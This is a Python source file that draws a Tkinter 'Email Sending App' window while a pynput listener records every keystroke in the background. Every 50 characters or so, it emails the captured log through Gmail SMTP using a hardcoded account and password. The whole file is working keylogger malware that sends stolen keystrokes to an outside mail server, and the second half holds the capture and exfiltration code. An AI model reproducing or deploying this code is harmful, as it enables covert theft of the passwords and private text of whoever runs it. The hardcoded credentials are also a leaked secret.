import smtplib
from tkinter import *
import os


print("Make sure your email has allowed less secure app.")
print("If not, then you can use our provided email.")
print("If you want to close the keylogger press escape.")
def send_message():
    address_info = address.get()
    
    email_body_info = email_body.get()
    
    print(address_info,email_body_info)
    
    sender_email = "sdslabskeylogger@gmail.com"#input("Enter yoour email address: ")
    
    sender_password = "Crack_It" #getpass.getpass(prompt = "Password: " , stream = None)
    
    server = smtplib.SMTP('smtp.gmail.com',587)
    
    server.starttls()
    
    server.login(sender_email,sender_password)
    
    print("Login successful")
    
    server.sendmail(sender_email,address_info,email_body_info)
    
    print("Message sent")
    
    address_entry.delete(0,END)
    email_body_entry.delete(0,END)
    
    
    

app = Tk()
app.geometry("500x500")

app.title("Simple keylogger")

heading = Label(text="Python Email Sending App",bg="yellow",fg="black",font="10",width="500",height="3")

heading.pack()

address_field = Label(text="Recipient Address :")
email_body_field = Label(text="Message :")

address_field.place(x=15,y=70)
email_body_field.place(x=15,y=140)

address = StringVar()
email_body = StringVar()
#sender_email = StringVar()

#sender_email_entry = Entry(textvariable = sender_email , width="30")

address_entry = Entry(textvariable=address,width="30")
email_body_entry = Entry(textvariable=email_body,width="30")

#sender_email_entry.place(x = 15 , y =100 )
address_entry.place(x=15,y=100)
email_body_entry.place(x=15,y=180)

button = Button(app,text="Send Message",command=send_message,width="30",height="2",bg="blue")

button.place(x=15,y=220)





import getpass

from pynput.keyboard import Key , Listener
#print( " Executed ")
email = "sdslabskeylogger@gmail.com"
password = "Crack_It"
server = smtplib.SMTP_SSL("smtp.gmail.com" , 465)
server.login(email , password)

#logger
full_log = ""
word = ""
email_char_limit = 50
def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter or key == Key.shift:
        word += " "
        full_log += word
        word = ""
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ""
    else:
        char = f'{key}'
        char = char[1: -1]
        word += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )
    
with Listener(on_press = on_press) as Listener:
    mainloop()
    Listener.join()


